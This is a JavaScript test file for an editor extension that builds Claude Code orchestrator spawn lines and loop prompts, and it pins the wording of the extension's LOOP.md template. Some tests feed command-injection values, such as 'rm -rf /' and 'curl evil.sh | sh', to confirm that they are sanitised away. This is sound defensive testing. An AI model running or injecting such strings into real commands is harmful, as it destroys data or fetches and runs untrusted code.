'use strict';
// buildLoopCommand slices the ## Automation section out of LOOP.md and requires a fenced block
// THERE (not the first fence in the file — LOOP.md has several earlier fences).
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const {
  buildLoopCommand, buildClaudeBase,
  PERMISSION_MODES, isValidPermissionMode, sanitizePermissionMode,
  isValidLoopInterval, sanitizeLoopInterval,
} = require('../out-test/loop.js');
const { parseTodo } = require('../out-test/parser.js');
const { serializeTodo } = require('../out-test/writer.js');
const { TASK_DEFAULTS } = require('../out-test/model.js');

// What the host hands the prompt builder with nothing configured (t-0e99).
const ALL_MODELS = ['opus', 'sonnet', 'fable', 'haiku'];
const cfg = (over = {}) => ({ groomConcurrency: 3, models: ALL_MODELS, defaults: TASK_DEFAULTS, ...over });

function readMedia(name) {
  return fs.readFileSync(path.join(process.cwd(), 'media', name), 'utf8');
}

// The standing worker instructions are the FIRST fence of the ## Automation section — not the
// first fence in the file (LOOP.md has several earlier ones), which is the same slice
// buildLoopCommand performs.
function automationFence(text) {
  const fence = text.slice(text.indexOf('## Automation')).split('```')[1];
  assert.ok(fence, 'Automation section has a fenced block');
  return fence;
}

test('buildLoopCommand: the orchestrator prompt names the role, interval, cap, task models and the five defaults (t-0e99)', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), '5m', cfg());
  assert.ok(cmd, 'a loop command was built from the shipped LOOP.md template');
  assert.match(cmd, /^\/loop 5m /, 'interval honored');
  assert.ok(cmd.includes('You are the LoopBoard orchestrator'), 'names the orchestrator role');
  assert.ok(cmd.includes('grooming concurrency cap of 3'), 'names the grooming cap');
  assert.ok(cmd.includes('Task models: opus, sonnet, fable, haiku.'), 'names the enabled task models');
  assert.ok(cmd.includes('Defaults: groomer opus effort auto, worker sonnet effort auto, reviewer none.'), 'names the five defaults');
  assert.ok(cmd.includes('.loopboard/LOOP.md'), 'points at LOOP.md');
  assert.ok(cmd.includes('Automation section'), 'directs the worker to the Automation section');
  assert.ok(!cmd.includes('running as model'), 'never names a model of its own: that is the legacy loop the template guard stops');
  assert.ok(!/Delegate work/i.test(cmd), 'no delegate phrase: delegation is always on (t-0e99)');
  assert.ok(!cmd.includes("'"), 'no apostrophes (short-argv escaping constraint)');
  assert.ok(!cmd.includes('\n'), 'single line for the TUI paste');
  assert.ok(cmd.length < 300, 'bootstrap prompt stays tiny');
});

test('buildLoopCommand: the longest realistic prompt still stays under 300 chars and apostrophe-free', () => {
  const longest = {
    groomConcurrency: 99,
    models: ALL_MODELS,
    defaults: { groomer: 'sonnet', groomerEffort: 'medium', worker: 'sonnet', workerEffort: 'medium', reviewer: 'sonnet' },
  };
  const cmd = buildLoopCommand(readMedia('template-loop.md'), '120m', longest);
  assert.ok(cmd.length < 300, 'length ' + cmd.length);
  assert.ok(!cmd.includes("'"));
});

test('buildLoopCommand: only the enabled models are listed, and none at all says so', () => {
  const tpl = readMedia('template-loop.md');
  assert.ok(buildLoopCommand(tpl, '1m', cfg({ models: ['opus', 'haiku'] })).includes('Task models: opus, haiku.'));
  assert.ok(buildLoopCommand(tpl, '1m', cfg({ models: [] })).includes('Task models: none.'));
});

test('buildLoopCommand: hostile models or defaults never reach the line; they fall back to the shipped defaults', () => {
  const tpl = readMedia('template-loop.md');
  const hostile = buildLoopCommand(tpl, '1m', {
    groomConcurrency: 3,
    models: ['opus', "x'; rm -rf /", 'gpt'],
    defaults: { groomer: "o'pus", groomerEffort: 'max', worker: 'none', workerEffort: '; ls', reviewer: 'everyone' },
  });
  assert.ok(hostile.includes('Task models: opus.'), hostile);
  assert.ok(hostile.includes('Defaults: groomer opus effort auto, worker sonnet effort auto, reviewer none.'), hostile);
  assert.ok(!hostile.includes('rm -rf') && !hostile.includes("'") && !hostile.includes('; ls'), hostile);
});

// The finishing order is a guarantee, not prose: if `phase: review` is set before the push, an
// interrupted worker leaves a Review task whose branch is missing or stale. Pin the ordered
// clause so a later compression pass cannot silently drop it (t-16d2).
test('template Automation block states the strict finishing order (Review move LAST)', () => {
  const fence = automationFence(readMedia('template-loop.md'));
  assert.match(fence, /LAST action, set `phase: review`/, 'Review move named as the last action');
  assert.ok(
    fence.indexOf('commit and push') < fence.indexOf('set `phase: review`'),
    'commit and push is ordered before the Review move',
  );
});

// The extension cannot read terminal output, so "do not idle until the next tick while eligible
// work remains" can only live in the instructions. Pin the clause and its terminator (t-ff77).
test('template Automation block tells a finished worker to start the pass over', () => {
  const fence = automationFence(readMedia('template-loop.md'));
  assert.match(fence, /does NOT end the pass/, 'a task leaving In Progress does not end the pass');
  assert.match(fence, /START OVER from the top of this block in the same pass/, 'restart is named');
  assert.match(fence, /nothing claimed and nothing reconciled/, 'loop-until-idle terminator');
  assert.match(fence, /NEVER idle until the next tick/, 'stated in NEVER terms');
  assert.ok(
    fence.indexOf('does NOT end the pass') > fence.indexOf('set `phase: review`'),
    'the restart clause follows the delivery and the Feedback-parking sentences it covers',
  );
});

// t-cffc: effort is the loop session's `claude --effort <level>` startup flag, passed on EVERY spawn.
test('buildClaudeBase: emits --effort <level> for every valid level', () => {
  for (const level of ['low', 'medium', 'high', 'xhigh', 'max']) {
    assert.equal(
      buildClaudeBase('auto', 'opus', undefined, level),
      `claude --permission-mode auto --model 'opus' --effort ${level}`
    );
  }
});

test('buildClaudeBase: effort defaults to medium when omitted', () => {
  assert.ok(buildClaudeBase('auto', 'opus').endsWith(' --effort medium'));
  assert.ok(buildClaudeBase('auto', 'opus', 'loopboard-opus').includes(' --effort medium '));
});

test('buildClaudeBase: an invalid effort falls back to medium rather than reaching the shell line raw', () => {
  for (const bad of ['extreme; rm -rf /', 'HIGH', '', 'ultracode', null, 5, {}]) {
    const line = buildClaudeBase('auto', 'opus', undefined, bad);
    assert.ok(line.endsWith(' --effort medium'), `expected ${JSON.stringify(bad)} -> medium`);
    assert.ok(!line.includes('extreme') && !line.includes('rm -rf'), 'the payload never reaches the line');
  }
});

test('buildLoopCommand: the bootstrap prompt carries no effort ceiling (t-cffc); effort appears only as a default', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), '1m', cfg());
  assert.ok(!cmd.includes('effort ceiling'));
  // The loop session effort is the --effort flag; the only efforts in the prompt are the two
  // per-task defaults (t-0e99).
  assert.equal(cmd.match(/effort/g).length, 2, cmd);
});

test('buildClaudeBase single-quotes the --model so glob metachars (haiku[1m]) do not expand', () => {
  assert.equal(
    buildClaudeBase('auto', 'haiku[1m]'),
    "claude --permission-mode auto --model 'haiku[1m]' --effort medium"
  );
  // A plain id is quoted too — harmless, and keeps one code path.
  assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus' --effort medium");
});

// t-2b89: the session name is what matches a slot to its `~/.claude/sessions/<pid>.json`, so it
// must actually reach the spawn line — and the line must stay apostrophe-free outside the quoted
// --model, since the whole command is re-quoted around the /loop prompt.
test('buildClaudeBase appends --name when a session name is given', () => {
  const line = buildClaudeBase('auto', 'opus[1m]', 'loopboard-opus', 'high');
  assert.equal(line, "claude --permission-mode auto --model 'opus[1m]' --effort high --name loopboard-opus");
  assert.ok(!buildClaudeBase('auto', 'opus').includes('--name'), 'omitted when no name is given');
});

test('isValidPermissionMode: accepts every package.json enum value, rejects anything else', () => {
  for (const m of PERMISSION_MODES) assert.ok(isValidPermissionMode(m), `${m} is valid`);
  assert.ok(!isValidPermissionMode('auto; curl evil.sh | sh'), 'shell injection rejected');
  assert.ok(!isValidPermissionMode(''), 'empty rejected');
  assert.ok(!isValidPermissionMode('AUTO'), 'case-sensitive');
});

test('sanitizePermissionMode: passes valid through, falls back to auto otherwise', () => {
  assert.equal(sanitizePermissionMode('bypassPermissions'), 'bypassPermissions');
  assert.equal(sanitizePermissionMode('auto; rm -rf /'), 'auto');
  assert.equal(sanitizePermissionMode(''), 'auto');
});

test('buildClaudeBase sanitizes an injected permissionMode so the shell line stays safe', () => {
  const line = buildClaudeBase('auto; curl evil.sh | sh', 'opus');
  assert.equal(line, "claude --permission-mode auto --model 'opus' --effort medium");
  assert.ok(!line.includes('curl'), 'the injected payload never reaches the shell line');
});

test('isValidLoopInterval: accepts <digits><s|m|h|d>, rejects garbage/injection', () => {
  for (const ok of ['1m', '5m', '30s', '2h', '7d', '10m']) assert.ok(isValidLoopInterval(ok), `${ok} valid`);
  for (const bad of ['', '1', 'm', '1x', '1m; ls', '-1m', '1 m', '1M']) assert.ok(!isValidLoopInterval(bad), `${bad} invalid`);
});

test('sanitizeLoopInterval falls back to 1m for invalid values', () => {
  assert.equal(sanitizeLoopInterval('5m'), '5m');
  assert.equal(sanitizeLoopInterval('1m; rm -rf /'), '1m');
  assert.equal(sanitizeLoopInterval('nonsense'), '1m');
});

test('buildLoopCommand sanitizes the interval before splicing it into the prompt', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), '5m; echo pwned', cfg());
  assert.ok(cmd, 'a command was built');
  assert.match(cmd, /^\/loop 1m /, 'invalid interval falls back to 1m');
  assert.ok(!cmd.includes('pwned'), 'the injected payload never reaches the prompt');
});

test('buildLoopCommand: undefined when there is no ## Automation section', () => {
  assert.equal(buildLoopCommand('# LOOP\n\n## Rules\n\n```\nsome fence\n```\n', '1m', cfg()), undefined);
});

test('buildLoopCommand: undefined when Automation has no fenced block', () => {
  assert.equal(buildLoopCommand('# LOOP\n\n## Automation\n\nNo code block here.\n', '1m', cfg()), undefined);
});

test('buildLoopCommand: an earlier fence (before ## Automation) is NOT picked', () => {
  // The Storage/Workflow fences come first; Automation itself has no fence -> undefined.
  const text = [
    '# LOOP', '', '## Storage', '', '```', 'layout', '```', '',
    '## Automation', '', 'Prose only, no fenced block.', '',
  ].join('\n');
  assert.equal(buildLoopCommand(text, '1m', cfg()), undefined);
});

test('template-todo.md scaffold parses to zero entries and is a fixpoint', () => {
  const src = readMedia('template-todo.md');
  const doc = parseTodo(src);
  assert.equal(doc.entries.length, 0, 'scaffold starts with no tasks');
  const once = serializeTodo(doc);
  const twice = serializeTodo(parseTodo(once));
  assert.equal(twice, once, 'fixpoint');
});

// ---- grooming concurrency cap (t-23ce) ----
// The cap rides the bootstrap prompt because the sync path copies template blocks byte-for-byte
// with no interpolation — LOOP.md can carry the BEHAVIOUR but never a configured NUMBER.

test('buildLoopCommand: the grooming concurrency cap is spliced into the prompt', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), '1m', cfg({ groomConcurrency: 5 }));
  assert.ok(cmd.includes('grooming concurrency cap of 5'), 'cap injected');
  assert.ok(!cmd.includes("'"), 'still apostrophe-free');
  assert.ok(!cmd.includes('\n'), 'still a single line');
  assert.ok(cmd.length < 300, 'still inside the bootstrap line budget');
});

test('buildLoopCommand: the cap defaults to 3 when omitted', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), '1m', cfg({ groomConcurrency: undefined }));
  assert.ok(cmd.includes('grooming concurrency cap of 3'));
});

test('buildLoopCommand: a hostile or out-of-range cap falls back to 3, never reaching the line raw', () => {
  // The value is spliced into a shell line, so anything not a plain in-range integer must not
  // survive. There is deliberately no `0 = unlimited` sentinel.
  for (const bad of ['5; rm -rf /', 0, -1, 1.5, NaN, Infinity, 100, null, undefined, {}]) {
    const cmd = buildLoopCommand(readMedia('template-loop.md'), '1m', cfg({ groomConcurrency: bad }));
    assert.ok(cmd.includes('grooming concurrency cap of 3'), `expected ${JSON.stringify(bad)} -> 3`);
    assert.ok(!cmd.includes('rm -rf'));
  }
});

test('the template states the cap behaviour without embedding a number', () => {
  // LOOP.md must never hard-code the cap: it is configurable, and the sync path
  // would copy the constant into every workspace identically.
  const tpl = readMedia('template-loop.md');
  assert.ok(tpl.includes('grooming concurrency cap named in your bootstrap prompt'));
  assert.ok(tpl.includes('index order'), 'names the tie-break');
  assert.match(tpl, /skipped task by title|by title in your report/, 'names the over-cap report');
});

// t-cffc: LOOP.md must not cap a subagent's effort from the bootstrap prompt, nor introduce
// per-agent-type effort (agent definitions / `--agents` JSON). t-716f amends t-cffc: the Agent tool
// now takes a per-spawn effort (Claude Code 2.1.292+) and the template's Subagents rule picks it,
// `xhigh` included — so `xhigh` left this list; the rubric itself is pinned in
// test/loop-delegation.test.js.
test('the template caps no subagent effort and names no agent definition', () => {
  const tpl = readMedia('template-loop.md');
  const rule14 = tpl.slice(tpl.indexOf('\n14. '), tpl.indexOf('\n15. '));
  const fence = automationFence(tpl);
  const delegated = fence.slice(fence.indexOf('DELEGATION (always on)'));
  for (const [name, text] of [['whole template', tpl], ['Rule 14', rule14], ['DELEGATION (always on)', delegated]]) {
    assert.ok(text.length > 0, `${name} found`);
    assert.doesNotMatch(text, /ceiling/i, `${name}: no effort ceiling`);
    assert.doesNotMatch(text, /reasoning effort|effort chosen|max only/i, `${name}: no ceiling-style effort pick`);
  }
  assert.doesNotMatch(tpl, /--agents|\.claude\/agents|agent type/i, 'no per-agent-type effort wording');
});

// Delegation (t-e3c3) is always on since t-0e99: no activation phrase rides the prompt and the
// template carries no switch, so every code-editing path and every review is a subagent.
test('the orchestrator prompt carries no delegation switch, whatever the old settings said', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), '5m', cfg());
  assert.ok(!cmd.includes('Delegate work') && !cmd.includes('without review'));
  assert.ok(cmd.includes('.loopboard/LOOP.md') && cmd.includes('Automation section'), 'still points at the Automation section');
  assert.ok(cmd.includes('grooming concurrency cap of'), 'still names the grooming cap');
});

test('template Automation block: delegation is always on, the review runs on the resolved reviewer, none = no review', () => {
  const fence = automationFence(readMedia('template-loop.md'));
  assert.ok(fence.includes('DELEGATION (always on)'), 'clause present');
  assert.ok(!fence.includes('DELEGATED-WORK MODE') && !fence.includes('`Delegate work to subagents`'), 'the old switch is gone');
  assert.ok(!fence.includes('`without review`'), 'the old review-off phrase is gone');
  assert.match(fence, /you NEVER edit code yourself/);
  assert.match(fence, /implementer subagent \(Agent tool\) on the task's resolved model and effort, which fetches/, 'implementer on the task model and effort');
  assert.match(fence, /no git worktree, no --no-verify/, 'implementer inherits the git contract');
  assert.match(fence, /writes any `\.loopboard\/` file/, 'subagents never write the tracker');
  assert.match(fence, /If the task's resolved reviewer is `none`: take the returned PR straight through the finishing order above/);
  assert.match(fence, /review subagent on the resolved reviewer model \(`auto` = the resolved groomer model; the resolved worker model when that is `auto` or `none`\) at the implementer's final effort, one step higher on Haiku/);
  assert.ok(!fence.includes('gh pr merge'), 'the loop never merges a PR (merging is the human action alone)');
  assert.match(fence, /NEVER merge a PR/, 'the prohibition is stated, not merely implied by absence');
  assert.match(fence, /Review = delivered with its PR still OPEN/, 'an open PR is the normal successful end state');
  assert.match(fence, /re-delegate ONCE/, 'fail path: one re-delegation');
  assert.match(fence, /second fail → `phase: feedback`/, 'then Feedback with the findings');
  assert.match(fence, /never self-accept/, 'Rule 1 gate survives');
  assert.match(fence, /Only one implementer or review subagent runs at a time/);
  assert.ok(fence.indexOf('DELEGATION (always on)') > fence.indexOf('reply "no changes"'), 'the clause trails the ordinary pass so the base instructions are untouched');
});

// ---- t-0e99: one orchestrator, no routing by a loop's own model ----

test('template: no rule or Automation step routes or claims by matching a loop model', () => {
  const tpl = readMedia('template-loop.md');
  const flat = (x) => x.replace(/\s+/g, ' ');
  const all = flat(tpl);
  for (const gone of [
    'whose `model:` is yours', 'if you are the default model', 'Loop whose model matches `groomer:`',
    'names a different model', 'regardless of model', 'your own slot model', 'same slot model',
    'Claim tasks by `model:`', '▶ buttons start per-model loops', 'DELEGATED-WORK MODE applies ONLY if',
  ]) {
    assert.ok(!all.includes(gone), 'still routes by a loop model: ' + gone);
  }
  const rule15 = flat(tpl.slice(tpl.indexOf('\n15. '), tpl.indexOf('\n16. ')));
  assert.match(rule15, /The orchestrator claims the top eligible Backlog task; `model:`\/`effort:` pick its implementer/);
  const rule14 = flat(tpl.slice(tpl.indexOf('\n14. '), tpl.indexOf('\n15. ')));
  assert.match(rule14, /the orchestrator grooms each through a grooming subagent \(Subagents below\), never inline/);
  assert.match(rule14, /`groomer: none` = ON HOLD/);
});

test('template: the legacy guard stands a per-model loop down, and the prompt never trips it', () => {
  const tpl = readMedia('template-loop.md');
  const fence = automationFence(tpl);
  assert.ok(fence.trimStart().startsWith('If your bootstrap prompt says `You are running as model`'), 'the guard comes first in the fence');
  assert.match(fence, /you are a legacy per-model loop that the one orchestrator replaced: do nothing else this pass and report only that this loop is obsolete and should be stopped/);
  assert.ok(!buildLoopCommand(tpl, '1m', cfg()).includes('You are running as model'));
});

test('template: grooming writes the auto picks onto the index, for grooming and for working', () => {
  const fence = automationFence(readMedia('template-loop.md'));
  assert.match(fence, /replace each of its groomer model and groomer effort that is `auto` \(set, or by default\) with its pick by the Subagents `auto` table from the draft text, `feedback:` and answers, written as `groomer:`\/`groomer-effort:` on its index entry BEFORE spawning, and leave a field that is not `auto` as set/);
  assert.match(fence, /when its worker model or effort is `auto`, brief the groomer to end its report with one line `work: <model> <effort> \(<signals>\)` picked the same way/);
  // Only the `auto` fields are replaced: an explicit model (Haiku or Fable included) survives.
  assert.match(fence, /an explicit worker model keeps its model and only takes the effort, one step higher on Haiku\), and write only the worker fields that are `auto` as concrete `model:`\/`effort:` together with the groomed story/);
  assert.match(fence, /a pick on the index then counts as set/);
  assert.match(fence, /a field set back to `auto` is picked again on the next re-groom/);
});

test('template: the Automation intro and Notes describe ONE orchestrator loop', () => {
  const tpl = readMedia('template-loop.md');
  const intro = tpl.slice(tpl.indexOf('## Automation'), tpl.indexOf('```', tpl.indexOf('## Automation')));
  assert.match(intro, /ONE orchestrator loop/);
  assert.match(intro, /`Claude Orchestrator`/);
  assert.ok(!/per model|You are running as/.test(intro));
  const notes = tpl.slice(tpl.indexOf('Notes:'), tpl.indexOf('<!-- loopboard:sync:automation:end -->'));
  assert.match(notes.replace(/\s+/g, ' '), /your own `--model`\/`--effort`, grooming cap, task models and defaults ride the spawn command/);
  assert.match(notes, /▶ starts the one orchestrator loop/);
});

test('revealStep: the row that last revealed toggles the panel; any other row shows (t-9c3f)', () => {
  const { revealStep } = require('../out-test/loop.js');
  assert.equal(revealStep('opus', 'opus'), 'togglePanel', 'same model -> toggle panel');
  assert.equal(revealStep('sonnet', 'opus'), 'show', 'different model -> show');
  assert.equal(revealStep(undefined, 'opus'), 'show', 'nothing revealed -> show');
});

test('template: one feedback rule, no note: grammar and no `note:` Rule 16 (t-ae10)', () => {
  const tpl = readMedia('template-loop.md');
  assert.doesNotMatch(tpl, /^\s*- note: </m, 'no note: grammar line');
  // t-716f re-used the number at the owner's request: Rule 16 is now the board-blind subagent rule
  // (pinned in test/loop-delegation.test.js). The old `note:` Rule 16 stays gone, and nothing
  // follows it.
  const rule16 = tpl.slice(tpl.indexOf('\n16. '), tpl.indexOf('\n**Subagents**'));
  assert.match(rule16, /^\n16\. Subagents are board-blind/, 'Rule 16 is only the board-blind rule');
  assert.doesNotMatch(rule16, /note:/, 'the old note: Rule 16 is gone');
  assert.doesNotMatch(tpl, /^17\. /m, 'no Rule 17');
  assert.match(tpl, /- feedback: <text> +\(repeatable, single line; any phase incl\. drafts;/);
  assert.match(tpl, /legacy `note:` = `feedback:`/);
  assert.match(tpl, /optional `model:`\.\.\.`reviewer:` keys and `feedback:`/, 'drafts may carry feedback and every routing key (t-0e99)');
  const rule13 = tpl.slice(tpl.indexOf('\n13. '), tpl.indexOf('\n14. '));
  assert.match(rule13, /On Review → move to In Progress/, 'Review reopens');
  // Re-pinned by t-92d7: code-touching feedback on Backlog/Feedback now takes an In Progress
  // round trip, so the three-phase in-place clause is gone (pinned in the t-92d7 case below).
  assert.match(rule13, /In Progress, or feedback touching no code on\s+Backlog\/Feedback → apply in place \(no phase move\)/, 'In Progress and code-free feedback apply in place');
  assert.match(rule13, /New\/DRAFT → the groomer's \(Rule 14\)/);
  const rule14 = tpl.slice(tpl.indexOf('\n14. '), tpl.indexOf('\n15. '));
  assert.match(rule14, /A New\/DRAFT `feedback:` →\s+the groomer folds it into the story/);
  const fence = automationFence(tpl);
  // Re-pinned by t-92d7 (see the t-92d7 case below for the round trip itself).
  assert.match(fence, /\(6\) For each `feedback:` sub-bullet on the index entry of a Backlog, In Progress or Feedback task/);
  assert.doesNotMatch(fence, /`note:`/, 'the Automation steps name no note');
});

test('template: code-touching feedback on Backlog/Feedback runs through In Progress, then returns (t-92d7)', () => {
  const tpl = readMedia('template-loop.md');
  const rule2 = tpl.slice(tpl.indexOf('\n2. '), tpl.indexOf('\n3. '));
  const rule11 = tpl.slice(tpl.indexOf('\n11. '), tpl.indexOf('\n12. '));
  const rule13 = tpl.slice(tpl.indexOf('\n13. '), tpl.indexOf('\n14. '));
  const flat = (s) => s.replace(/\s+/g, ' ');
  const r13 = flat(rule13);

  // The old one-clause in-place path for all three phases is gone.
  assert.doesNotMatch(r13, /Backlog\/In Progress\/Feedback → apply in place \(no phase move\)/, 'old three-phase clause gone');

  // Code-touching feedback on a Backlog AND a Feedback task takes the round trip, in order.
  assert.match(r13, /Code-touching feedback \(edits code, a branch, a commit or a PR — Rule 11's list\) on a Backlog or Feedback task = ROUND TRIP/, 'both phases named');
  const order = [
    'set `phase: inprogress` FIRST',
    'apply it',
    'commit and push to its `task/**` branch',
    'delete the `feedback:` line',
    'then return the task to its previous phase LAST',
  ].map((s) => r13.indexOf(s));
  order.forEach((i) => assert.ok(i > 0, 'round-trip step present'));
  assert.deepEqual(order, [...order].sort((a, b) => a - b), 'inprogress FIRST → apply → push → delete → previous phase LAST');

  // A Feedback task keeps its questions, and the round trip runs even while they are unanswered.
  assert.match(r13, /A Feedback task keeps its `question:`\/`answer:` pairs untouched and takes the round trip even while they are unanswered/);

  // Feedback touching no code keeps the in-place path with no phase move.
  assert.match(r13, /feedback touching no code on Backlog\/Feedback → apply in place \(no phase move\), append `<today>` to `## Worklog`, delete it/);

  // started: is left untouched (Rule 13 and the Rule 11 exemption).
  assert.match(r13, /`phase: inprogress` FIRST \(`started:` untouched — not a claim, not a resume\)/);
  assert.match(flat(rule11), /A feedback round trip \(Rule 13\) moves the phase only: no `started:`/);

  // A Backlog round trip's later claim continues on the branch it pushed.
  assert.match(r13, /A Backlog round trip branches off latest `main`, names the branch in `## Worklog`; the later claim continues on that `task\/\*\*` branch, never a second one/);

  // Rule 2 blocks the round trip while another task is In Progress.
  assert.match(flat(rule2), /no loop starts a Backlog task, resumes a Review\/Feedback task or runs a feedback round trip \(Rule 13\)/);
  assert.match(r13, /ROUND TRIP, gated by Rule 2/);

  // In Progress still applies in place; Review still reopens through In Progress, Review LAST.
  assert.match(r13, /In Progress, or feedback touching no code on Backlog\/Feedback → apply in place/);
  assert.match(r13, /On Review → move to In Progress, address, update `## Delivered`, remove the `feedback:` sub-bullet\(s\), commit and push, and return to Review LAST/);

  // Automation step (6) pins the same round trip, gated on Rule 2, previous phase LAST after the push.
  const fence = automationFence(tpl);
  const step6 = fence.slice(fence.indexOf('(6) '), fence.indexOf('(7) '));
  assert.doesNotMatch(fence, /\(6\) Apply in place, with no phase move/, 'old step (6) wording gone');
  assert.match(step6, /on an In Progress task, or when it touches no code, apply it in place with no phase move, then delete it/);
  assert.match(step6, /code-touching feedback on a Backlog or Feedback task takes the ROUND TRIP only if nothing else is In Progress \(Rule 2\), else leave it for a later pass/);
  assert.match(step6, /set `phase: inprogress` FIRST \(leave `started:` untouched\), apply it, commit and push to its `task\/\*\*` branch, delete the `feedback:` sub-bullet, and ONLY after that push, as the LAST action, return the task to its previous phase/);
  assert.match(step6, /a Feedback task keeps its questions, answered or not/);
  assert.ok(!step6.includes("'"), 'step (6) stays apostrophe-free (the fence rides as single-quoted argv)');
});

// ---- t-0e99: one terminal, Claude Orchestrator; per-model terminals are legacy ----

test('the only loop terminal is Claude Orchestrator, and the per-model names are recognised as legacy', () => {
  const { loopTerminalName, legacyLoopTerminals, LEGACY_LOOP_TERMINALS } = require('../out-test/loop.js');
  const { LOOP_IDS } = require('../out-test/model.js');
  assert.deepEqual(LOOP_IDS.map(loopTerminalName), ['Claude Orchestrator']);
  assert.deepEqual(LEGACY_LOOP_TERMINALS, ['Claude Opus', 'Claude Sonnet', 'Claude Fable']);
  assert.deepEqual(
    legacyLoopTerminals(['zsh', 'Claude Opus', 'Claude Orchestrator', 'Claude Fable', 'Claude Haiku', 'claude opus']),
    ['Claude Opus', 'Claude Fable'],
  );
  assert.deepEqual(legacyLoopTerminals([]), []);
});

test('the spawn line carries the orchestrator --model, --effort and --name loopboard-orchestrator-<suffix>', () => {
  const { spawnSessionName, sessionSuffix } = require('../out-test/context.js');
  const line = buildClaudeBase('auto', 'opus[1m]', spawnSessionName('orchestrator', sessionSuffix(0.5)), 'high');
  assert.equal(line, "claude --permission-mode auto --model 'opus[1m]' --effort high --name loopboard-orchestrator-8000");
});

test('src/terminals.ts names every terminal it creates through loopTerminalName, never from a model id', () => {
  const src = fs.readFileSync(path.join(process.cwd(), 'src', 'terminals.ts'), 'utf8');
  const creates = src.split('\n').filter((l) => l.includes('createTerminal('));
  assert.deepEqual(creates.map((l) => l.trim()), ["const terminal = vscode.window.createTerminal({ name: loopTerminalName(loop), cwd: this.getCwd() });"]);
  assert.ok(!src.includes('BUILTIN_MODEL_IDS'), 'terminals are never keyed by task models');
});

